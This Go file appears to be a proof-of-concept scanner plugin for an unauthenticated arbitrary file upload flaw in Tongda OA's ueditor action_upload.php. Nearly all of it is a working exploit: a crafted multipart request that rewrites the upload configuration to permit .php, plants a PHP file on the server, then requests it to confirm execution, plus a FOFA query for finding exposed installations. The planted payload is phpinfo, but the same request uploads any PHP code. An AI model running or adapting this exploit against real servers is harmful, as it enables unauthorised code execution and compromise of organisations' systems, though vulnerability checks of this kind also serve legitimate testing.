package main

import (
	"errors"
	"fmt"
	"github.com/ExpLangcn/HwToolslibrary/library/httpclient"
	"github.com/ExpLangcn/HwToolslibrary/library/info"
	"net/http"
	"strings"
)

var POC info.POC
var Httprecord = make(map[*httpclient.RequestOptions]*httpclient.Response) // 配置请求信息

func init() {
	POC = info.POC{ // 初始化POC信息
		Info: info.POCInfo{
			Name:     "通达OA任意文件上传漏洞",
			Author:   "ExpLang",
			Describe: "通达OA_action_upload.php_文件过滤不足且无需后台权限，导致任意文件上传漏洞",
			Date:     "2023-09-26",
			Tags:     []string{"通达OA", "TongdaOA", "File_Upload", "任意文件上传"},
			Level:    "high",
			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html"},
		},
		Other: info.OtherInfo{
			FOFAGrammar:  "app=\"TDXK-通达OA\"",
			QuakeGrammar: "",
		},
	}
}

func Start(Target string, ProxyURL string) (bool, error) {
	// 构建文件上传的请求体
	requestBody := `-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ffff
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

tcmd
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="ffff"; filename="test.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="mufile"

submit
-----------------------------55719851240137822763221368724--`

	// 设置请求选项
	requestOptions := &httpclient.RequestOptions{
		Method: http.MethodPost,
		URL:    Target + "/module/ueditor/php/action_upload.php?action=uploadfile",
		Headers: map[string]string{
			"User-Agent":       httpclient.RandomUserAgent(),
			"Content-Type":     "multipart/form-data; boundary=---------------------------55719851240137822763221368724",
			"Content-Length":   fmt.Sprintf("%d", len(requestBody)),
			"X_requested_with": "XMLHttpRequest",
			"Accept-Encoding":  "gzip",
		},
		ProxyURL:    ProxyURL,
		RequestBody: []byte(requestBody),
	}

	// 发送请求
	responseOption, success := httpclient.SendRequest(*requestOptions)
	Httprecord[requestOptions] = responseOption

	if responseOption.Err != nil {
		// 处理错误
		return false, responseOption.Err
	} else {
		if !success {
			// 发送请求失败
			return false, errors.New("请求失败")
		}
	}

	POC.Info.HttpInfo = Httprecord

	statusCode := responseOption.StatusCode
	if statusCode == http.StatusOK {
		Success, err := PHPINFO(Target, ProxyURL)
		if err != nil {
			return false, err
		}

		if Success {
			return true, nil
		}
	}
	return false, nil

}

func PHPINFO(Target string, ProxyURL string) (bool, error) {
	// 定义请求选项
	requestOption := &httpclient.RequestOptions{
		Method: http.MethodGet,
		URL:    Target + "/tcmd.php",
		Headers: map[string]string{
			"User-Agent": httpclient.RandomUserAgent(),
		},
		ProxyURL: ProxyURL,
	}

	// 发送请求
	responseOption, success := httpclient.SendRequest(*requestOption)
	Httprecord[requestOption] = responseOption

	if responseOption.Err != nil {
		// 处理错误
		return false, responseOption.Err
	} else {
		if !success {
			// 发送请求失败
			return false, errors.New("请求失败")
		}
	}

	POC.Info.HttpInfo = Httprecord

	statusCode := responseOption.StatusCode
	if statusCode == http.StatusOK {
		// 检查响应内容是否包含 "$ROOT_PATH=getenv"
		responseBody := string(responseOption.Body)
		if strings.Contains(responseBody, "PHP Version") {
			return true, nil
		}
	}
	return false, nil
}
